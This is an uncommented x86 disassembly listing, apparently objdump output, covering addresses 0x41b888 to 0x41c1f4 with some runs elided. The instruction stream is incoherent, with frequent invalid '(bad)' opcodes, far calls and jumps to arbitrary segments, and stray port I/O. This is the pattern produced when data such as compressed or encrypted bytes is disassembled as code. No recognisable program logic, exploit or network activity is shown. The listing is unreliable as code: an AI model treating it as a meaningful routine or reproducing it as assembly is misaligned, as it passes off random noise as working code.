  41b888:	add    eax,0xb1000001
  41b88d:	outs   dx,BYTE PTR ds:[esi]
  41b88e:	adc    al,0x98
  41b890:	sub    eax,0x7886f16f
  41b895:	call   0xb602:0x42e5dcdc
  41b89c:	ds push esi
  41b89e:	(bad)  
  41b89f:	jl     0x41b82a
  41b8a1:	rol    BYTE PTR [ebx+0x5ed17f04],cl
  41b8a7:	sbb    DWORD PTR [esp+ebp*2-0xe],0xffffffa8
  41b8ac:	(bad)  
  41b8ad:	sbb    BYTE PTR [edi],ch
  41b8af:	xchg   ecx,eax
  41b8b0:	xor    ebx,DWORD PTR [ebx-0xf00c306]
  41b8b6:	pop    ebp
  41b8b7:	hlt    
  41b8b8:	jecxz  0x41b92b
  41b8ba:	mov    gs,ebp
  41b8bc:	lea    esi,[ecx+0x5]
  41b8bf:	cmp    eax,0x119bc12b
  41b8c4:	cwde   
  41b8c5:	inc    ecx
  41b8c6:	stos   DWORD PTR es:[edi],eax
  41b8c7:	in     eax,0x30
  41b8c9:	enter  0xf313,0x84
  41b8cd:	cs ret 0x8ba1
  41b8d1:	out    dx,eax
  41b8d2:	je     0x153c06e4
  41b8d8:	mov    eax,ds:0xac131c25
  41b8dd:	mov    eax,ds:0x3429e884
  41b8e2:	dec    ebx
  41b8e3:	jnp    0x41b929
  41b8e5:	retf   
  41b8e6:	out    dx,eax
  41b8e7:	push   esi
  41b8e8:	(bad)  [eax+ebx*2+0x54]
  41b8ec:	or     edi,DWORD PTR es:[ebp-0x4d]
  41b8f0:	mov    ecx,0xf9963e18
  41b8f5:	push   ss
  41b8f6:	xlat   BYTE PTR ds:[ebx]
  41b8f7:	ds ret 0xb677
  41b8fb:	popa   
  41b8fc:	call   0xcbb2:0xd83e68ca
  41b903:	lahf   
  41b904:	gs retf 
  41b906:	mov    ah,0xb2
  41b908:	ins    BYTE PTR es:[edi],dx
  41b909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b90a:	jne    0x41b928
  41b90c:	aaa    
  41b90d:	pop    edx
  41b90e:	push   ecx
  41b90f:	adc    esp,DWORD PTR [edi+ebp*1+0x7a]
  41b913:	stc    
  41b914:	ret    0x77c9
  41b917:	pop    eax
  41b918:	loop   0x41b8f1
  41b91a:	in     eax,0x9e
  41b91c:	fist   WORD PTR [edi]
  41b91e:	mov    ds:0x3c227192,al
  41b923:	xchg   esp,eax
  41b924:	mov    bh,0x6b
  41b926:	in     al,0xc6
  41b928:	cmp    al,0x5a
  41b92a:	push   esp
  41b92b:	sbb    eax,DWORD PTR [eax-0x37]
  41b92e:	or     dl,dh
  41b930:	test   DWORD PTR [eax],ecx
  41b932:	sar    esi,cl
  41b934:	pop    edx
  41b935:	into   
  41b936:	and    edx,0x4c
  41b939:	cmp    DWORD PTR [ebp-0x637d2461],edx
  41b93f:	xor    edi,esp
  41b941:	aam    0x55
  41b943:	mov    esi,0x25b3e259
  41b948:	push   edx
  41b949:	mov    al,0xfb
  41b94b:	or     esp,DWORD PTR [edi+0x44366f2c]
  41b951:	sbb    DWORD PTR [edi],ebx
  41b953:	sbb    ebp,esi
  41b955:	retf   
  41b956:	or     al,0xa6
  41b958:	mov    ?,ecx
  41b95a:	loopne 0x41b9d0
  41b95c:	shr    cl,1
  41b95e:	popa   
  41b95f:	or     ecx,DWORD PTR ds:0x939521f1
  41b965:	fnstsw WORD PTR [eax+ecx*4-0x83d49db]
  41b96c:	(bad)  
  41b96d:	sub    al,0x6b
  41b96f:	jl     0x41b984
  41b971:	fnstenv [ebx-0x3c8d91a]
  41b977:	scas   al,BYTE PTR es:[edi]
  41b978:	adc    BYTE PTR [ebx-0x43],ch
  41b97b:	jp     0x41b9ed
  41b97d:	es addr16 aaa 
  41b980:	or     ebp,DWORD PTR [edx-0x40d6d030]
  41b986:	xor    al,ch
  41b988:	clc    
  41b989:	mov    esi,0xdc851d36
  41b98e:	jle    0x41b930
  41b990:	cmp    BYTE PTR [eax],al
	...
  41b9f2:	add    BYTE PTR [eax],al
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	push   eax
  41ba01:	jecxz  0x41b9b1
  41ba03:	pcmpeqd mm4,QWORD PTR ds:0x1050001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	xor    BYTE PTR [ebp-0x70e36122],ch
  41ba12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba13:	push   ds
  41ba14:	inc    edi
  41ba15:	cmc    
  41ba16:	push   ebp
  41ba17:	inc    ebp
  41ba18:	dec    ebx
  41ba19:	das    
  41ba1a:	loope  0x41ba1d
  41ba1c:	lods   eax,DWORD PTR ds:[esi]
  41ba1d:	mov    BYTE PTR [ecx],dh
  41ba1f:	pop    es
  41ba20:	xchg   DWORD PTR [ecx+ecx*1],esp
  41ba23:	add    ah,bl
  41ba25:	stos   DWORD PTR es:[edi],eax
  41ba26:	mov    eax,0xa0e7401
  41ba2b:	icebp  
  41ba2c:	mov    esp,0x61243a8
  41ba31:	out    0xa4,al
  41ba33:	inc    ecx
  41ba34:	and    edx,DWORD PTR ds:0xc2af9e60
  41ba3a:	lock xor DWORD PTR fs:[ecx+0x78],ebx
  41ba3f:	cs adc al,0xfc
  41ba42:	int    0x67
  41ba44:	mov    WORD PTR [edi-0x43],es
  41ba47:	pop    eax
  41ba48:	pop    ebp
  41ba49:	and    eax,0x5fff3f2b
  41ba4e:	jae    0x41ba66
  41ba50:	fs fcom st(4)
  41ba53:	das    
  41ba54:	loope  0x41ba56
  41ba56:	cwde   
  41ba57:	or     ch,bl
  41ba59:	cmc    
  41ba5a:	retf   
  41ba5b:	bound  edi,QWORD PTR [ecx-0x7c]
  41ba5e:	out    0x5,al
  41ba60:	adc    BYTE PTR [ebx],ch
  41ba62:	mov    al,ch
  41ba64:	jl     0x41bab1
  41ba66:	jo     0x41ba14
  41ba68:	mov    esi,0x772eadf8
  41ba6d:	add    al,0xc8
  41ba6f:	aad    0x11
  41ba71:	ret    0x1acd
  41ba74:	(bad)  
  41ba75:	or     BYTE PTR [esi-0x8],al
  41ba78:	jge    0x41ba44
  41ba7a:	mov    ds:0xdda232f1,eax
  41ba7f:	jno    0x41ba68
  41ba81:	add    DWORD PTR [ecx+edi*2+0x2dff16b3],edx
  41ba88:	jl     0x41baa9
  41ba8a:	add    DWORD PTR [esi+0x3a],ebp
  41ba8d:	and    eax,0x453566a4
  41ba92:	lahf   
  41ba93:	push   edx
  41ba94:	and    BYTE PTR [edx],0x2f
  41ba97:	cs (bad) 
  41ba99:	dec    ecx
  41ba9a:	push   ss
  41ba9b:	pop    ebx
  41ba9c:	mov    ds:0x3052a42e,eax
  41baa1:	sti    
  41baa2:	mov    ah,0x9d
  41baa4:	sub    esi,DWORD PTR [ebp+0x30]
  41baa7:	nop
  41baa8:	mov    dx,WORD PTR [esi+0x19]
  41baac:	fsubr  QWORD PTR [ebx]
  41baae:	sub    dl,BYTE PTR [edi]
  41bab0:	jg     0x41baf7
  41bab2:	dec    DWORD PTR [ebp+0x7f]
  41bab5:	nop    eax
  41bab8:	xchg   ebx,eax
  41bab9:	xchg   edi,eax
  41baba:	bnd jns 0x41ba5c
  41babd:	call   0xffcd:0x9b9cedcd
  41bac4:	push   cs
  41bac5:	pop    ss
  41bac6:	sahf   
  41bac7:	retf   0xb65
  41baca:	call   0x82dd8b29
  41bacf:	mov    BYTE PTR [esi+ebx*8],bh
  41bad2:	push   cs
  41bad3:	rcl    ecx,1
  41bad5:	adc    ebx,DWORD PTR [ecx]
  41bad7:	xor    al,0xeb
  41bad9:	cmp    al,0x86
  41badb:	int    0x7b
  41badd:	push   cs
  41bade:	out    0x5d,eax
  41bae0:	lods   al,BYTE PTR ds:[esi]
  41bae1:	fld    DWORD PTR [edi+0x23]
  41bae4:	or     eax,0xb5c4a001
  41bae9:	mov    eax,0xdc277577
  41baee:	fs idiv ebp
  41baf1:	push   es
  41baf2:	sbb    al,0xf
  41baf4:	cli    
  41baf5:	fmul   st,st(7)
  41baf7:	mov    al,ds:0x4630fd27
  41bafc:	cmp    al,bh
  41bafe:	xor    BYTE PTR [ebp-0x23],al
  41bb01:	imul   ebp,DWORD PTR [edi-0x13d9561b],0xffffffa3
  41bb08:	pop    ebx
  41bb09:	mov    edi,0x11a3bbb9
  41bb0e:	lahf   
  41bb0f:	loope  0x41bb05
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x60],cx
  41bb81:	nop
  41bb82:	stos   DWORD PTR es:[edi],eax
  41bb83:	jb     0x41bc00
  41bb85:	add    DWORD PTR es:[eax],eax
  41bb88:	add    eax,0xb000001
  41bb8d:	push   ss
  41bb8e:	ins    DWORD PTR es:[edi],dx
  41bb8f:	outs   dx,BYTE PTR ds:[esi]
  41bb90:	loopne 0x41bb4a
  41bb92:	or     eax,0xfdda8233
  41bb97:	add    al,dl
  41bb99:	jmp    0x41bb5c
  41bb9b:	inc    esi
  41bb9c:	adc    DWORD PTR [ebx],edx
  41bb9e:	jmp    0x49ddf7d9
  41bba3:	fbstp  TBYTE PTR [ecx]
  41bba5:	outs   dx,BYTE PTR ds:[esi]
  41bba6:	push   esi
  41bba7:	std    
  41bba8:	or     DWORD PTR [esi+0x44a0ae02],ecx
  41bbae:	fistp  DWORD PTR [eax]
  41bbb0:	inc    esi
  41bbb1:	cmp    DWORD PTR [edx+0x223bf0f8],esp
  41bbb7:	ss fs dec edi
  41bbba:	mov    BYTE PTR [esi+edi*4-0x76],bl
  41bbbe:	inc    ebp
  41bbbf:	dec    ebp
  41bbc0:	pushf  
  41bbc1:	(bad)  
  41bbc2:	ret    0xd9a0
  41bbc5:	icebp  
  41bbc6:	mov    WORD PTR [edi-0x721b2233],gs
  41bbcc:	mov    ah,0x66
  41bbce:	cs or  esp,edx
  41bbd1:	pop    esp
  41bbd2:	mov    dh,0x2d
  41bbd4:	(bad)  
  41bbd5:	aad    0x5b
  41bbd7:	sub    al,BYTE PTR [ebp-0x35842bb3]
  41bbdd:	sbb    edi,DWORD PTR [edi+ebp*2]
  41bbe0:	inc    ebp
  41bbe1:	les    esp,FWORD PTR [esi+edx*1-0x2b43339b]
  41bbe8:	imul   edx,edi,0xe775a1b0
  41bbee:	out    0xbe,eax
  41bbf0:	jle    0x41bba1
  41bbf2:	pop    esp
  41bbf3:	(bad)  
  41bbf5:	pop    eax
  41bbf6:	enter  0x1c03,0x26
  41bbfa:	sti    
  41bbfb:	mov    bl,0x32
  41bbfd:	jnp    0x41bbe4
  41bbff:	cmp    dh,BYTE PTR [ebp-0x12]
  41bc02:	mov    esi,0x653405c3
  41bc07:	pop    DWORD PTR [ecx-0x10cef324]
  41bc0d:	inc    ecx
  41bc0e:	jecxz  0x41bbe9
  41bc10:	pop    ss
  41bc11:	bound  ebp,QWORD PTR [eax]
  41bc13:	repnz mov esp,0xe96e53fd
  41bc19:	cmp    eax,DWORD PTR [esi]
  41bc1b:	out    0x71,eax
  41bc1d:	into   
  41bc1e:	repnz addr16 loope 0x41bbd8
  41bc22:	es pop edx
  41bc24:	ficomp WORD PTR [ebx-0x7137513f]
  41bc2a:	push   cs
  41bc2b:	mov    ebx,0x32ae73d
  41bc30:	pop    ds
  41bc31:	loop   0x41bbf5
  41bc33:	hlt    
  41bc34:	mov    edi,0x26ff5ce4
  41bc39:	xchg   ebx,eax
  41bc3a:	ficomp DWORD PTR [esi]
  41bc3c:	xlat   BYTE PTR ds:[ebx]
  41bc3d:	(bad)  [eax-0x472763bb]
  41bc43:	pop    edi
  41bc44:	retf   0x5158
  41bc47:	mov    ds:0xa829c1dc,eax
  41bc4c:	add    edx,DWORD PTR [ebx]
  41bc4e:	mov    dl,0xe7
  41bc50:	retf   0x1977
  41bc53:	or     DWORD PTR [ebp-0x7e],ebx
  41bc56:	retf   0xf353
  41bc59:	test   DWORD PTR [esi+ecx*8+0x3576948c],edx
  41bc60:	arpl   bp,cx
  41bc62:	sbb    al,0x46
  41bc64:	jns    0x41bcb2
  41bc66:	mov    WORD PTR [esi-0x7d],cs
  41bc69:	jge    0x41bc20
  41bc6b:	push   ss
  41bc6c:	dec    edx
  41bc6d:	scas   al,BYTE PTR es:[edi]
  41bc6e:	loope  0x41bc56
  41bc70:	fsub   DWORD PTR [ebx+0x47]
  41bc73:	lea    esp,[esi-0x4d]
  41bc76:	call   0x42da:0x38bab706
  41bc7d:	or     ebp,DWORD PTR [ebx+edi*8]
  41bc80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc81:	and    DWORD PTR [ecx+0x6a28e8f3],eax
  41bc87:	in     al,0x59
  41bc89:	and    bh,BYTE PTR cs:[ecx-0x4dd4ac45]
  41bc90:	jae    0x41bc92
	...
  41bcf2:	add    BYTE PTR [eax],al
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xcf63d9d8
  41bd02:	lahf   
  41bd03:	mov    ds:0x12780,eax
  41bd08:	add    eax,0xa6000001
  41bd0d:	inc    esi
  41bd0e:	scas   al,BYTE PTR es:[edi]
  41bd0f:	and    al,0x47
  41bd11:	cdq    
  41bd12:	pop    ebx
  41bd13:	cmp    ebp,edx
  41bd15:	int3   
  41bd16:	pop    esi
  41bd17:	dec    al
  41bd19:	retf   0x3280
  41bd1c:	dec    esi
  41bd1d:	lea    esi,[eax]
  41bd1f:	add    eax,0xb3cb2c01
  41bd24:	or     eax,DWORD PTR [edi-0x66]
  41bd27:	inc    esp
  41bd28:	stos   BYTE PTR es:[edi],al
  41bd29:	jo     0x41bd41
  41bd2b:	xchg   DWORD PTR [esi],esp
  41bd2d:	sahf   
  41bd2e:	mov    ds:0x30791106,al
  41bd33:	dec    esp
  41bd34:	xor    edx,ebx
  41bd36:	imul   eax,DWORD PTR [ecx+ebx*4-0x31],0x19
  41bd3b:	inc    BYTE PTR [eax]
  41bd3d:	fnstenv [ecx]
  41bd3f:	test   al,0xbe
  41bd41:	bound  edi,QWORD PTR [ecx+eax*2+0x51]
  41bd45:	std    
  41bd46:	jmp    0xb8ac6718
  41bd4b:	fsubr  st,st(6)
  41bd4d:	(bad)  
  41bd4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd4f:	sbb    edi,DWORD PTR [edi+0x67]
  41bd52:	push   esp
  41bd53:	lock jnp 0x41bd5d
  41bd56:	loop   0x41bcf9
  41bd58:	nop
  41bd59:	jmp    0x41a02a12
  41bd5e:	push   ebx
  41bd5f:	(bad)  
  41bd60:	xchg   ecx,eax
  41bd61:	fdiv   QWORD PTR [ecx]
  41bd63:	lds    ebp,FWORD PTR [esi+ebp*4]
  41bd66:	scas   al,BYTE PTR es:[edi]
  41bd67:	xor    eax,0xd598f937
  41bd6c:	xchg   esp,eax
  41bd6d:	ins    BYTE PTR es:[edi],dx
  41bd6e:	loope  0x41bd30
  41bd70:	cmc    
  41bd71:	sub    eax,0x1057404b
  41bd76:	xor    esp,esp
  41bd78:	es xor eax,0x42c41989
  41bd7e:	jmp    0xa7d2:0x35000faf
  41bd85:	push   eax
  41bd86:	and    edx,DWORD PTR [esi+0x3c]
  41bd89:	stc    
  41bd8a:	mov    al,0x5e
  41bd8c:	fsub   DWORD PTR [ebx+ebx*1+0x3852d698]
  41bd93:	xor    eax,0x8978c12b
  41bd98:	push   ebx
  41bd99:	and    BYTE PTR [edx-0x5ac6e287],0x4e
  41bda0:	pop    edx
  41bda1:	outs   dx,BYTE PTR ds:[esi]
  41bda2:	dec    ecx
  41bda3:	repnz inc eax
  41bda5:	scas   eax,DWORD PTR es:[edi]
  41bda6:	sub    DWORD PTR [ecx+0x70],0x8bea24ef
  41bdad:	jb     0x41bd4a
  41bdaf:	inc    edx
  41bdb0:	cmp    ebp,DWORD PTR [edx+esi*1+0x449ee93c]
  41bdb7:	ror    BYTE PTR [edx-0x3a],1
  41bdba:	repnz inc ebx
  41bdbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdbd:	push   0x577c6622
  41bdc2:	dec    ebp
  41bdc3:	clc    
  41bdc4:	mov    edx,0x915b298a
  41bdc9:	xor    eax,0xcd902b8f
  41bdce:	mov    esi,0x9e88a5ef
  41bdd3:	sbb    ecx,0xffffffec
  41bdd6:	push   0x5c580348
  41bddb:	sbb    eax,0xf613e3bb
  41bde0:	popa   
  41bde1:	xchg   ebx,eax
  41bde2:	aaa    
  41bde3:	std    
  41bde4:	xchg   BYTE PTR [ebp+0x4132bc6d],dl
  41bdea:	into   
  41bdeb:	gs popf 
  41bded:	je     0x41bd80
  41bdef:	pop    ds
  41bdf0:	test   BYTE PTR [ebx-0x7f],al
  41bdf3:	push   0xffffffe6
  41bdf5:	push   ebx
  41bdf6:	mov    al,ds:0x26deda16
  41bdfb:	jl     0x41bd9b
  41bdfd:	ins    BYTE PTR es:[edi],dx
  41bdfe:	(bad)  
  41bdff:	mov    eax,0xacf4ad55
  41be04:	mov    dl,0x91
  41be06:	cli    
  41be07:	int3   
  41be08:	(bad)  
  41be09:	xchg   esp,eax
  41be0a:	iret   
  41be0b:	in     eax,0xcb
  41be0d:	pop    edx
  41be0e:	fdivr  st,st(5)
  41be10:	push   0x0
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x1f89c09a]
  41be82:	inc    ebp
  41be83:	int3   
  41be84:	test   DWORD PTR [eax],ebp
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    eax,0x47000001
  41be8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be8e:	mov    al,ds:0x8ca908ab
  41be93:	and    ch,BYTE PTR [ebx+0x31]
  41be96:	or     ecx,ebx
  41be98:	in     al,dx
  41be99:	outs   dx,DWORD PTR ds:[esi]
  41be9a:	mov    al,0x74
  41be9c:	dec    esp
  41be9d:	rol    dl,0xb1
  41bea0:	out    0xba,al
  41bea2:	cs repnz cwde 
  41bea5:	push   esi
  41bea6:	sti    
  41bea7:	in     al,0xda
  41bea9:	push   ss
  41beaa:	fistp  DWORD PTR [edi]
  41beac:	hlt    
  41bead:	sub    edx,DWORD PTR [esi-0x34]
  41beb0:	dec    ebp
  41beb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beb2:	inc    edx
  41beb3:	xor    bx,WORD PTR [ecx+0x2]
  41beb7:	add    esi,edx
  41beb9:	jns    0x41beeb
  41bebb:	fcmovu st,st(5)
  41bebd:	add    bh,BYTE PTR [edi+0x28a24b3d]
  41bec3:	sub    esi,DWORD PTR [eax]
  41bec5:	push   edi
  41bec6:	jp     0x41bf08
  41bec8:	pop    ebp
  41bec9:	dec    ebx
  41beca:	inc    edx
  41becb:	sub    eax,0x85fafe6a
  41bed0:	mov    eax,0x37980482
  41bed5:	idiv   ebp
  41bed7:	jmp    0x4d97:0xac6c8217
  41bede:	aam    0xa7
  41bee0:	dec    ecx
  41bee1:	ror    DWORD PTR [esi+0x17],0xb6
  41bee5:	mov    ds:0x399f6688,al
  41beea:	mov    ebp,0x1594f687
  41beef:	mov    ebp,0x91f9eedc
  41bef4:	pop    edi
  41bef5:	or     DWORD PTR [edi-0x6a],eax
  41bef8:	inc    ebx
  41bef9:	mov    edi,DWORD PTR [ebx-0x8]
  41befc:	sbb    DWORD PTR [edi+0x17],ebx
  41beff:	fbld   TBYTE PTR [ecx-0x42]
  41bf02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf03:	int    0x1b
  41bf05:	push   ebp
  41bf06:	out    dx,al
  41bf07:	pushf  
  41bf08:	xor    BYTE PTR [esi],0x92
  41bf0b:	cwde   
  41bf0c:	xor    ah,BYTE PTR [eax]
  41bf0e:	(bad)  
  41bf0f:	and    BYTE PTR [ecx-0x78],ah
  41bf12:	xchg   ebx,eax
  41bf13:	ret    
  41bf14:	xchg   esp,eax
  41bf15:	test   BYTE PTR [edx-0x25],bl
  41bf18:	jo     0x41bf63
  41bf1a:	ds (bad) 
  41bf1c:	mov    DWORD PTR [esi+0x4968ab01],eax
  41bf22:	cmp    cl,BYTE PTR ds:0xaa2f68d7
  41bf28:	daa    
  41bf29:	test   BYTE PTR [esi-0x5],dl
  41bf2c:	fdiv   QWORD PTR [esi-0x59]
  41bf2f:	aad    0x24
  41bf31:	enter  0xa998,0x4d
  41bf35:	dec    ebp
  41bf36:	mov    BYTE PTR [ebx],bh
  41bf38:	xor    edx,DWORD PTR [ebx+0x272e3a1b]
  41bf3e:	add    ecx,DWORD PTR [esi+0x1f57eca9]
  41bf44:	in     eax,dx
  41bf45:	ret    
  41bf46:	push   ebp
  41bf47:	fisubr WORD PTR [edi]
  41bf49:	aad    0x13
  41bf4b:	sbb    al,0x6a
  41bf4d:	js     0x41bfcb
  41bf4f:	test   al,0x8e
  41bf51:	mov    dl,dl
  41bf53:	inc    esi
  41bf54:	scas   eax,DWORD PTR es:[edi]
  41bf55:	cmp    BYTE PTR [edi],bl
  41bf57:	test   al,0xae
  41bf59:	xor    eax,0xc70ba8b5
  41bf5e:	sbb    al,0xf3
  41bf60:	sub    eax,0xe8238e32
  41bf65:	dec    esp
  41bf66:	jg     0x41bef2
  41bf68:	xchg   ah,dl
  41bf6a:	and    ch,BYTE PTR [ecx-0x38c58012]
  41bf70:	add    ecx,ebx
  41bf72:	fstp   QWORD PTR [ebx]
  41bf74:	adc    DWORD PTR [ecx-0x2],0xfffffff1
  41bf78:	adc    al,0x76
  41bf7a:	xchg   ebp,eax
  41bf7b:	pop    eax
  41bf7c:	nop
  41bf7d:	out    0xe4,eax
  41bf7f:	std    
  41bf80:	stos   DWORD PTR es:[edi],eax
  41bf81:	ins    DWORD PTR es:[edi],dx
  41bf82:	add    DWORD PTR [edx+0x749d964],0x4f
  41bf89:	daa    
  41bf8a:	sub    dh,BYTE PTR [eax+0x25]
  41bf8d:	hlt    
  41bf8e:	push   edi
  41bf8f:	dec    ecx
  41bf90:	popa   
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	in     eax,0xd0
  41c002:	into   
  41c003:	xchg   esp,eax
  41c004:	mov    ch,BYTE PTR [ecx]
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    eax,0x29000001
  41c00d:	stc    
  41c00e:	push   eax
  41c00f:	or     ecx,DWORD PTR [eax+0x7d]
  41c012:	iret   
  41c013:	hlt    
  41c014:	icebp  
  41c015:	test   BYTE PTR [esi-0x7e],bl
  41c018:	fcom   DWORD PTR [ebp-0x79f6acc6]
  41c01e:	xchg   esi,eax
  41c01f:	push   eax
  41c020:	jp     0x41c043
  41c022:	xlat   BYTE PTR ds:[ebx]
  41c023:	mov    cl,0xe3
  41c025:	dec    ecx
  41c026:	adc    DWORD PTR [eax+0x2b],edx
  41c029:	popf   
  41c02a:	fistp  DWORD PTR [eax]
  41c02c:	ins    DWORD PTR es:[edi],dx
  41c02d:	enter  0x3bb8,0x3
  41c031:	or     al,0x43
  41c033:	aaa    
  41c034:	rol    DWORD PTR [edx],0x35
  41c037:	mov    al,ds:0x18e49853
  41c03c:	jno    0x41c02b
  41c03e:	jmp    0x41bfce
  41c040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c041:	adc    DWORD PTR [eax],esp
  41c043:	sar    DWORD PTR [eax],cl
  41c045:	hlt    
  41c046:	jmp    0x41c092
  41c048:	or     dl,cl
  41c04a:	xchg   esi,eax
  41c04b:	ror    BYTE PTR [ebp+0x50f8f8f5],1
  41c051:	mov    eax,ds:0x5b8c475a
  41c056:	add    edi,DWORD PTR [eax-0x80]
  41c059:	and    esi,esi
  41c05b:	cli    
  41c05c:	mov    ?,WORD PTR [eax]
  41c05e:	pop    ss
  41c05f:	mov    ds:0xfb8408ac,eax
  41c064:	aam    0xd7
  41c066:	call   FWORD PTR [ebx-0x3d]
  41c069:	fiadd  DWORD PTR [ebp-0x37]
  41c06c:	jp     0x41c05d
  41c06e:	in     eax,0xc8
  41c070:	fucom  st(2)
  41c072:	(bad)  
  41c073:	outs   dx,DWORD PTR ds:[esi]
  41c074:	push   ss
  41c075:	scas   al,BYTE PTR es:[edi]
  41c076:	ror    DWORD PTR [eax],1
  41c078:	mov    ah,BYTE PTR [edx-0x47]
  41c07b:	enter  0x477a,0xe
  41c07f:	(bad)  
  41c080:	xchg   ecx,eax
  41c081:	nop
  41c082:	stc    
  41c083:	mov    eax,ds:0x8987a389
  41c088:	ins    BYTE PTR es:[edi],dx
  41c089:	add    edx,DWORD PTR [ebp+0x2d647535]
  41c08f:	out    dx,eax
  41c090:	and    BYTE PTR [esi+0x54],ah
  41c093:	rcl    DWORD PTR fs:[ebp-0x47],1
  41c097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c098:	push   ds
  41c099:	mov    DWORD PTR [eax],eax
  41c09b:	lds    edi,FWORD PTR [edx]
  41c09d:	or     al,0xea
  41c09f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0a0:	push   ecx
  41c0a1:	bound  esi,QWORD PTR [edx-0x18c4bf1c]
  41c0a7:	fisub  WORD PTR [ecx]
  41c0a9:	out    0x79,al
  41c0ab:	xchg   esp,eax
  41c0ac:	dec    ebp
  41c0ad:	cmc    
  41c0ae:	in     al,dx
  41c0af:	out    0x3a,al
  41c0b1:	jns    0x41c09f
  41c0b3:	push   ebp
  41c0b4:	cli    
  41c0b5:	or     DWORD PTR [esp+ecx*8-0x12],edi
  41c0b9:	fwait
  41c0ba:	(bad)  
  41c0bb:	cli    
  41c0bc:	lods   eax,DWORD PTR ds:[esi]
  41c0bd:	aad    0x56
  41c0bf:	add    ebp,DWORD PTR [esi]
  41c0c1:	es stos DWORD PTR es:[edi],eax
  41c0c3:	pop    ebx
  41c0c4:	ins    DWORD PTR es:[edi],dx
  41c0c5:	gs inc esp
  41c0c7:	aas    
  41c0c8:	push   esi
  41c0c9:	fistp  QWORD PTR [ebx]
  41c0cb:	outs   dx,BYTE PTR ds:[esi]
  41c0cc:	shr    DWORD PTR [ebx+0x5e],0xc2
  41c0d0:	in     eax,0x71
  41c0d2:	ror    DWORD PTR [ecx*8-0x29016aba],0xc3
  41c0da:	jl     0x41c116
  41c0dc:	sub    eax,DWORD PTR [edx+0x4beb7ea5]
  41c0e2:	fcom   DWORD PTR [eax-0x4]
  41c0e5:	jmp    0xe50d:0x7f7d493e
  41c0ec:	inc    esi
  41c0ed:	or     dl,dl
  41c0ef:	inc    edx
  41c0f0:	jb     0x41c13e
  41c0f2:	xlat   BYTE PTR ds:[ebx]
  41c0f3:	test   eax,0xeac868dd
  41c0f8:	inc    edi
  41c0f9:	mov    DWORD PTR [edi],edx
  41c0fb:	jne    0x41c175
  41c0fd:	push   ebx
  41c0fe:	jns    0x41c101
  41c100:	mov    edx,esp
  41c102:	fld    DWORD PTR [esi-0x15]
  41c105:	sbb    eax,0x7647306e
  41c10a:	sub    DWORD PTR [esi+0x67],esp
  41c10d:	popa   
  41c10e:	(bad)  [edx+0x62]
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x79e90501,0xffffffb8
  41c182:	inc    edi
  41c183:	into   
  41c184:	(bad)
  41c188:	add    eax,0xd1000001
  41c18d:	jmp    0x2249f945
  41c192:	cmp    al,0x70
  41c194:	pop    esp
  41c195:	xchg   esp,eax
  41c196:	ins    DWORD PTR es:[edi],dx
  41c197:	xchg   ebx,eax
  41c198:	xor    ebx,edi
  41c19a:	ss popf 
  41c19c:	inc    edi
  41c19d:	enter  0x7ab1,0x8c
  41c1a1:	jno    0x41c12c
  41c1a3:	fbld   TBYTE PTR [eax]
  41c1a5:	dec    ebp
  41c1a6:	ds stos BYTE PTR es:[edi],al
  41c1a8:	ins    BYTE PTR es:[edi],dx
  41c1a9:	ins    DWORD PTR es:[edi],dx
  41c1aa:	push   edi
  41c1ab:	cli    
  41c1ac:	shl    BYTE PTR [edi],0xfe
  41c1af:	xchg   edx,eax
  41c1b0:	mov    ah,0xbf
  41c1b2:	jnp    0x41c1b3
  41c1b4:	fisubr WORD PTR [esi]
  41c1b6:	jnp    0x41c21a
  41c1b8:	retf   0x7527
  41c1bb:	dec    dh
  41c1bd:	xor    al,0xe5
  41c1bf:	pop    ebp
  41c1c0:	mov    ebp,DWORD PTR [eax+0x15c4c221]
  41c1c6:	out    dx,eax
  41c1c7:	cmp    al,0x68
  41c1c9:	sar    ecx,0x72
  41c1cc:	mov    esi,0xdaf422fe
  41c1d1:	loop   0x41c1c4
  41c1d3:	cmp    al,0xeb
  41c1d5:	sub    al,0x2a
  41c1d7:	(bad)
  41c1db:	push   0x62a213d6
  41c1e0:	and    dl,BYTE PTR [eax-0x65]
  41c1e3:	rcl    DWORD PTR [edx+0x7b],cl
  41c1e6:	or     ecx,DWORD PTR [edi-0x1e87649b]
  41c1ec:	imul   eax,DWORD PTR [esi+esi*2-0x7d],0x907199e3
  41c1f4:	ffree  st(0)
